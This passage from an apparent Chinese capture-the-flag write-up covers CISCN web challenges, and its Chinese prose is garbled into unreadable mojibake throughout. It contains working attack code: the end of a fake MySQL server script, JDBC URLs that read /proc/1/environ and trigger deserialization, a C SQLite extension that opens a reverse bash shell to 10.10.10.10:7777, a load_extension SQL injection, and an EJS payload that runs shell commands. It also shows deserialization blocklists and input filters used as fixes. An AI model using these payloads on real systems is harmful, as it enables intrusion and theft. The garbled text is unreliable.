mysql_data += data_len_hex + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;fbfc&#x27;</span>+ payload_length_hex</span><br><span class="line">                mysql_data += str(payload_content)</span><br><span class="line">                mysql_data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> in data:</span><br><span class="line">                payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST =<span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">    PORT = <span class="number">3309</span></span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    #å½“socketå…³é—­åï¼Œæœ¬åœ°ç«¯ç”¨äºè¯¥socketçš„ç«¯å£å·ç«‹åˆ»å°±å¯ä»¥è¢«é‡ç”¨.ä¸ºäº†å®éªŒçš„æ—¶å€™ä¸ç”¨ç­‰å¾…å¾ˆé•¿æ—¶é—´</span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.format(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure><p>æ”¹ä¸€ä¸‹è¯»å–çš„æ–‡ä»¶ï¼Œæ”¹æˆæˆ‘ä»¬çš„åºåˆ—åŒ–ç”Ÿæˆçš„æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">json2 = &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;url&quot;</span>:<span class="string">&quot;jdbc:mysql://xxx:3306/?user=fileread_netdoc:///proc/1/environ&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true#&quot;</span>,</span><br><span class="line"><span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;wcsndm&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘é€è¿™ä¸ª json å¯ä»¥è¯»å–æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">json = &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;url&quot;</span>:<span class="string">&quot;jdbc:mysql://xxxx:7777/?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;</span>,</span><br><span class="line"><span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;wcsndm&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘é€è¿™ä¸ªå¯ä»¥è¿›è¡Œ JDBC ååºåˆ—åŒ–ä»è€Œå†™æ–‡ä»¶</p><p>load_extensions</p><p>å¯ä»¥é€šè¿‡ sqlite åŠ è½½æ’ä»¶ rce</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line"># <span class="number">1.</span> åˆ›å»ºæ•°æ®åº“è¿æ¥ï¼ˆè¿™ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ•°æ®åº“æ–‡ä»¶ example.dbï¼‰</span><br><span class="line">conn = sqlite3.connect(<span class="string">&#x27;example.db&#x27;</span>)</span><br><span class="line"></span><br><span class="line"># <span class="number">2.</span> åˆ›å»ºä¸€ä¸ªæ¸¸æ ‡å¯¹è±¡</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line"># <span class="number">3.</span> åˆ›å»ºè¡¨</span><br><span class="line">cursor.execute(<span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">CREATE TABLE IF NOT EXISTS users (</span></span><br><span class="line"><span class="string">    id INTEGER PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">    name TEXT NOT NULL,</span></span><br><span class="line"><span class="string">    email TEXT NOT NULL UNIQUE</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"># <span class="number">4.</span> æ’å…¥æ•°æ®</span><br><span class="line">users = [</span><br><span class="line">    (<span class="string">&#x27;Alice&#x27;</span>, <span class="string">&#x27;alice@example.com&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;Bob&#x27;</span>, <span class="string">&#x27;bob@example.com&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;Charlie&#x27;</span>, <span class="string">&#x27;charlie@example.com&#x27;</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">cursor.executemany(<span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">INSERT INTO users (name, email) VALUES (?, ?)</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span>, users)</span><br><span class="line"></span><br><span class="line"># <span class="number">5.</span> æäº¤äº‹åŠ¡</span><br><span class="line">conn.commit()</span><br><span class="line"></span><br><span class="line"># <span class="number">6.</span> æŸ¥è¯¢æ•°æ®</span><br><span class="line">cursor.execute(<span class="string">&#x27;SELECT * FROM users&#x27;</span>)</span><br><span class="line">rows = cursor.fetchall()</span><br><span class="line"></span><br><span class="line"># <span class="number">7.</span> æ˜¾ç¤ºæŸ¥è¯¢ç»“æœ</span><br><span class="line"><span class="keyword">for</span> row in rows:</span><br><span class="line">    print(f<span class="string">&quot;ID: &#123;row[0]&#125;, Name: &#123;row[1]&#125;, Email: &#123;row[2]&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"># <span class="number">8.</span> å…³é—­è¿æ¥</span><br><span class="line">conn.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆä¸€ä¸ª db</p><p>ç½‘ä¸Šæ‰¾äº†ä¸ªé¡¹ç›®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Add your header comment here */</span></span><br><span class="line">#include &lt;sqlite3ext.h&gt; <span class="comment">/* Do not use &lt;sqlite3.h&gt;! */</span></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;dirent.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">SQLITE_EXTENSION_INIT1</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Insert your extension code here */</span></span><br><span class="line"><span class="type">int</span> <span class="variable">tcp_port</span> <span class="operator">=</span> <span class="number">7777</span>;</span><br><span class="line"><span class="type">char</span> *ip = <span class="string">&quot;10.10.10.10&quot;</span>;</span><br><span class="line"></span><br><span class="line">#ifdef _WIN32</span><br><span class="line"><span class="title function_">__declspec</span><span class="params">(dllexport)</span></span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sqlite3_extension_init</span><span class="params">(</span></span><br><span class="line"><span class="params">  sqlite3 *db, </span></span><br><span class="line"><span class="params">  <span class="type">char</span> **pzErrMsg, </span></span><br><span class="line"><span class="params">  const sqlite3_api_routines *pApi</span></span><br><span class="line"><span class="params">)</span>&#123;</span><br><span class="line">  <span class="type">int</span> <span class="variable">rc</span> <span class="operator">=</span> SQLITE_OK;</span><br><span class="line">  SQLITE_EXTENSION_INIT2(pApi);</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> fd;</span><br><span class="line">  <span class="keyword">if</span> ( fork() &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">    struct sockaddr_in addr;</span><br><span class="line">    addr.sin_family = AF_INET;</span><br><span class="line">    addr.sin_port = htons(tcp_port);</span><br><span class="line">    addr.sin_addr.s_addr = inet_addr(ip);</span><br><span class="line"></span><br><span class="line">    fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( connect(fd, (struct sockaddr*)&amp;addr, sizeof(addr)) )&#123;</span><br><span class="line">            exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dup2(fd, <span class="number">0</span>);</span><br><span class="line">    dup2(fd, <span class="number">1</span>);</span><br><span class="line">    dup2(fd, <span class="number">2</span>);</span><br><span class="line">    execve(<span class="string">&quot;/bin/bash&quot;</span>, 0LL, 0LL);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>éœ€è¦æ”¹ä¸€ä¸‹ç«¯å£å·</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libsqlite3-dev</span><br><span class="line">gcc -g -fPIC -shared YourCode.c -o YourCode.so</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘</p><p>ç„¶åå†™å…¥æŠŠ so å’Œ db æ–‡ä»¶å†™å…¥ç›®æ ‡æœåŠ¡å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json3 = &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;3&quot;</span>,<span class="string">&quot;url&quot;</span>:<span class="string">&quot;jdbc:sqlite:/tmp/user.db&quot;</span>,<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;users where name = load_extension(&#x27;/tmp/exp.so&#x27;)&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>å‘é€è¿™ä¸ªï¼Œæ‰“ sqlite</p><p><img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/image-20240725160822995.png" alt="image-20240725160822995"></p><p>æœ€ååˆèµ›ä¹Ÿæ˜¯ååŒ—ç¬¬ä¸‰å‡ºçº¿äº†</p><h1 id="ååŒ—åˆ†åŒºåŠå†³èµ›"><span id="ååŒ—åˆ†åŒºåŠå†³èµ›"> ååŒ—åˆ†åŒºåŠå†³èµ›</span></h1><p>å»å¹´ååŒ—å…­æœˆåˆå°±å¼€æ‰“äº†ï¼Œä»Šå¹´æ„£æ˜¯ 23ã€24 å·æ‰“ï¼Œå»å¹´æœ€æ—©ï¼Œä»Šå¹´æœ€æ™šï¼Œæ›´ç¦»è°±çš„æ˜¯æ‰“æ¯”èµ›é‚£ä¸€å¤©æˆ‘å±…ç„¶æ²¡æœ‰å®‰æ’è€ƒè¯•ï¼Œå‰åä¸€å¤©éƒ½æ˜¯è€ƒè¯•å®‰æ’ï¼ŒçœŸæ˜¯å¹¸è¿ã€‚</p><p>æ‰“è¿™ä¸ªæ˜¥ç§‹çš„ awdpï¼Œawdp ä¼šä¸ä¼šæ‰“æ²¡é‚£ä¹ˆé‡è¦ï¼Œä¼šä¿®æ‰é‡è¦ï¼Œä¸€å…±å››ä¸ª webï¼Œæˆ‘å…¨éƒ½ä¸çŸ¥é“æ¼æ´ç‚¹åœ¨å“ªï¼Œä½†åŸºæœ¬ä¸Šå‡­ç›´è§‰ä¸Š waf å°±è¿‡äº†ï¼Œåªèƒ½è¯´æ··çš„ä¸€æ‰‹å¥½çƒŸã€‚</p><p>å»ºè®®ä¸‹ä¸ª wslï¼Œæ”¹å®Œåç›´æ¥é€šè¿‡ wsl æ‰“åŒ…å°±è¡Œäº†</p><h2 id="wp"><span id="wp"> wp</span></h2><p>åªæœ‰ fixï¼Œæ²¡æœ‰ breakã€‚</p><h3 id="brokenscanner"><span id="brokenscanner"> brokenscanner</span></h3><p><img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/image-20240725163932059.png" alt="image-20240725163932059"></p><p>ç›´æ¥ä¸Š wafï¼Œç®€å•ç²—æš´ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆæ‰“çš„.</p><h3 id="crazydata"><span id="crazydata"> crazydata</span></h3><p><img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/image-20240725164015911.png" alt="image-20240725164015911"></p><p>åŒæ ·æ˜¯å¯¹äºä¼ å…¥çš„å‚æ•°ï¼Œç‹ ç‹ åœ°ä¸Š wafã€‚</p><h3 id="fury"><span id="fury"> fury</span></h3><p><img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/image-20240725164116381.png" alt="image-20240725164116381"></p><p>å¯¹äºååºåˆ—åŒ–çš„å‚æ•°ç›´æ¥è¿›è¡Œè¿‡æ»¤ï¼Œä¸€éè¿‡ã€‚</p><p>æ‹¿äº†ä¸ªäºŒè¡€ï¼Œå±±æ²³ giegie æ‹¿çš„æ˜¯ä¸€è¡€ã€‚</p><h2 id="ç¢ç¢å¿µ"><span id="ç¢ç¢å¿µ"> ç¢ç¢å¿µ</span></h2><p>äº‹æƒ…åˆ°è¿™é‡Œå·²ç»å‘å±•ä¸å¯¹åŠ²äº†ï¼Œæˆ‘ä»¬æœ€åæ˜¯æ‰“äº†ä¸ªååŒ—ç¬¬å››ï¼Œç„¶åå±±æ²³ giegie æœ€åæ˜¯ 12 è¿˜æ˜¯ 13ï¼Œé—æ†¾å€’åœ¨äº†åŠå†³ã€‚</p><p>çœŸâˆš8 æŠ½è±¡ï¼Œnmd ä»–ä»¬ pwn çˆ¹ä¿®ä¹Ÿä¿®å¾—æ…¢ï¼Œbreak å¬è¯´ç®€å•çš„é¢˜ä¹Ÿæ²¡æ‰“å‡ºæ¥ã€‚æ® kğŸ‘´æœ¬äººæ‰€è¯´ï¼ŒinkeyâœŒåœ¨å‰ä¸€å¤©æ™šä¸Šç–¯ç‹‚ç©è€å¤´ç¯ï¼ŒkâœŒä»¥ä¸ºä»–å¤‡å¥½èµ›äº†ğŸ˜¡ï¼Œbydã€‚</p><p>è°èƒ½æƒ³åˆ°ä¸€ä¸ªåˆèµ›åšå‡ºå‡ è§£çš„ pwn çˆ¹ï¼ŒåŠå†³èµ›ç®€å•çš„ break å’Œ fix æ²¡å‡ºğŸ˜Šã€‚åæ­£ä½  kâœŒæ˜¯çº¢æ¸©äº†ï¼Œåé¢ä¹Ÿæ˜¯ä¸åœåœ°æ‹·æ‰“ inkeyã€‚</p><p>æˆ‘ä»¬å­¦æ ¡ä¹Ÿæœ‰è‡ªå·±çš„ 2.5 æ¡æ‚Ÿã€‚</p><p>äºæ˜¯äº‹æƒ…å°±å‘å±•æˆäº†ï¼Œå•Šï¼Œæˆ‘æ‰“å®¿å‚© (æˆ‘æ‹¿å›½ä¸€)ï¼ŒçœŸçš„å‡çš„ã€‚</p><p><img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/fc961a27d7cd9945d438ac645f110ac.jpg" alt="fc961a27d7cd9945d438ac645f110ac"></p><p><img src="/2024/07/25/CISCN%E4%B9%8B%E6%97%85/b63e8e4bb6eee09ec2502a5e5e9d704.webp" alt="b63e8e4bb6eee09ec2502a5e5e9d704"></p><h1 id="å›½å†³"><span id="å›½å†³"> å›½å†³</span></h1><p>åƒå‘¼ä¸‡å”¤å§‹å‡ºæ¥ï¼Œç»ˆäºæ˜¯æ¥åˆ°äº†å›½å†³â˜ğŸ¤“ï¼Œæ—©ä¸Šèµ¶ tm ä¸ƒç‚¹å››åäº”çš„é£æœºï¼Œä»æ·±åœ³èµ·é£æ¥åˆ°äº†ä¼ è¯´ä¸­ä¸€å¤œ 8000 çš„åŒæµæœºåœºï¼ˆbushiã€‚</p><h2 id="awdp"><span id="awdp"> awdp</span></h2><h3 id="sharecard"><span id="sharecard"> sharecard</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app</span>.route(<span class="string">&quot;/showCard&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>])</span><br><span class="line">def <span class="title function_">show_card</span><span class="params">()</span>:</span><br><span class="line">    token = request.args.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    data = jwt.decode(token, rsakey.publickey().exportKey(), algorithms=jwt.algorithms.get_default_algorithms())</span><br><span class="line">    blacklists = [<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;|&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> i in blacklists:</span><br><span class="line">        <span class="keyword">if</span> i in data[<span class="string">&#x27;avatar&#x27;</span>] or <span class="string">&#x27;..&#x27;</span> in data[<span class="string">&#x27;avatar&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> safer_render_template(<span class="string">&quot;create.html&quot;</span>)</span><br><span class="line">    info = Info(**data)</span><br><span class="line"></span><br><span class="line">    info.parse_avatar()</span><br><span class="line">    blacklists2 = [<span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;_&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> i in blacklists2:</span><br><span class="line">        <span class="keyword">if</span> i in info.name or i in info.signature:</span><br><span class="line">            <span class="keyword">return</span> safer_render_template(<span class="string">&quot;create.html&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> safer_render_template(<span class="string">&quot;show.html&quot;</span>, info=info)</span><br></pre></td></tr></table></figure><p>å¤§èƒ†çŒœ sstiï¼Œè¿‡æ»¤ä¸€ä¸‹è¿‡äº†</p><h3 id="solonmaster"><span id="solonmaster"> SolonMaster</span></h3><p>ğŸ•ğŸŒ¿çš„ ideaï¼Œè¿™ä¸ªç¼–è¯‘å‡ºæ¥ä¸¤ä¸ªç±»ï¼Œidea åªæ˜¾ç¤ºä¸€ä¸ªæ–‡ä»¶ï¼Œtmd å­ç±»æ²¡æœ‰ï¼Œä¿®äº†åä¸‰æ¬¡ä¸€ç›´æ²¡ patch ä¸Šï¼Œçœ‹äººå®¶ä¸‰åå¤šè§£ï¼ŒğŸ‘´æ€¥äº†ğŸ˜¡ğŸ˜¡ğŸ˜¡ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…</p><p>æœ€åç›´æ¥åœ¨èµ„æºç®¡ç†å™¨æŠŠç¼–è¯‘çš„å­ç±» patch ä¸Šå»äº†ï¼Œä¸€éè¿‡ï¼Œæ—¥äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">                <span class="keyword">if</span>(desc.getName().contains(<span class="string">&quot;asp&quot;</span>)||desc.getName().contains(<span class="string">&quot;javax.management&quot;</span>)||desc.getName().contains(<span class="string">&quot;AbstractTranslet&quot;</span>)||desc.getName().contains(<span class="string">&quot;Fastjson&quot;</span>)||desc.getName().contains(<span class="string">&quot;jmx&quot;</span>)||desc.getName().contains(<span class="string">&quot;HashMap&quot;</span>)||desc.getName().contains(<span class="string">&quot;java.lang&quot;</span>)||desc.getName().contains(<span class="string">&quot;com.alibaba.fastjson.JSONArray&quot;</span>)||desc.getName().contains(<span class="string">&quot;HashMap&quot;</span>)||desc.getName().contains(<span class="string">&quot;com.alibaba.fastjson&quot;</span>)||desc.getName().contains(<span class="string">&quot;javax.swing&quot;</span>)||desc.getName().contains(<span class="string">&quot;java&quot;</span>))&#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;HackerClass:&quot;</span> + desc);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">targetc</span> <span class="operator">=</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">                <span class="keyword">if</span>(targetc.getName().contains(<span class="string">&quot;asp&quot;</span>)||targetc.getName().contains(<span class="string">&quot;javax.management&quot;</span>)||targetc.getName().contains(<span class="string">&quot;AbstractTranslet&quot;</span>)||targetc.getName().contains(<span class="string">&quot;Fastjson&quot;</span>)||targetc.getName().contains(<span class="string">&quot;jmx&quot;</span>)||targetc.getName().contains(<span class="string">&quot;HashMap&quot;</span>)||targetc.getName().contains(<span class="string">&quot;java.lang&quot;</span>)||targetc.getName().contains(<span class="string">&quot;com.alibaba.fastjson.JSONArray&quot;</span>)||targetc.getName().contains(<span class="string">&quot;HashMap&quot;</span>)||targetc.getName().contains(<span class="string">&quot;com.alibaba.fastjson&quot;</span>)||targetc.getName().contains(<span class="string">&quot;javax.management&quot;</span>)||targetc.getName().contains(<span class="string">&quot;javax.swing&quot;</span>)||javax.swing.event.SwingPropertyChangeSupport.class.isAssignableFrom(targetc)||desc.getName().contains(<span class="string">&quot;java&quot;</span>))&#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;HackerClass:&quot;</span> + targetc);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (BadAttributeValueExpException.class.isAssignableFrom(targetc)|| java.util.HashMap.class.isAssignableFrom(targetc)|| JSONArray.class.isAssignableFrom(targetc)|| AbstractAction.class.isAssignableFrom(targetc)|| Map.class.isAssignableFrom(targetc)|| XString.class.isAssignableFrom(targetc)|| StyledEditorKit.AlignmentAction.class.isAssignableFrom(targetc)||AbstractAction.class.isAssignableFrom(targetc)||StyledEditorKit.BoldAction.class.isAssignableFrom(targetc)||StyledEditorKit.StyledTextAction.class.isAssignableFrom(targetc)||StyledEditorKit.UnderlineAction.class.isAssignableFrom(targetc)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;HackerClass:&quot;</span> + targetc);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">this</span>.check &amp;&amp; !User.class.isAssignableFrom(targetc)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;HackerClass:&quot;</span> + targetc);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (BadAttributeValueExpException.class.isAssignableFrom(targetc)|| java.util.HashMap.class.isAssignableFrom(targetc)|| JSONArray.class.isAssignableFrom(targetc)|| AbstractAction.class.isAssignableFrom(targetc)|| Map.class.isAssignableFrom(targetc)|| XString.class.isAssignableFrom(targetc)|| StyledEditorKit.AlignmentAction.class.isAssignableFrom(targetc)||AbstractAction.class.isAssignableFrom(targetc)||StyledEditorKit.BoldAction.class.isAssignableFrom(targetc)||StyledEditorKit.StyledTextAction.class.isAssignableFrom(targetc)||StyledEditorKit.UnderlineAction.class.isAssignableFrom(targetc)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;HackerClass:&quot;</span> + targetc);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">this</span>.check = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">return</span> targetc;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><h3 id="ezjs"><span id="ezjs"> ezjs</span></h3><p>è¿æ°”å¥½ï¼Œæ‹¿äº†ä¸ª fix ä¸€è¡€ã€‚</p><p>fix</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (newFilePath.endsWith(<span class="string">&#x27;.html&#x27;</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> res.status(<span class="number">400</span>).send(<span class="string">&#x27;Invalid file type.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (newFilePath.endsWith(<span class="string">&#x27;.htm&#x27;</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> res.status(<span class="number">400</span>).send(<span class="string">&#x27;Invalid file type.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (newFilePath.endsWith(<span class="string">&#x27;.ts&#x27;</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> res.status(<span class="number">400</span>).send(<span class="string">&#x27;Invalid file type.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (newFilePath.endsWith(<span class="string">&#x27;.js&#x27;</span>))&#123;</span><br><span class="line">    <span class="keyword">return</span> res.status(<span class="number">400</span>).send(<span class="string">&#x27;Invalid file type.&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>break</p><p>.ejs ç»•è¿‡æ–‡ä»¶ä¸Šä¼ </p><p>render ä¼ å‚ .ejs/â€¦/ ç»•è¿‡ render æ£€éªŒ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= global.process.mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;cat /flag&#x27;</span>)%&gt;</span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰æ˜¯éé¢„æœŸã€‚</p><p>md è¿™ idea 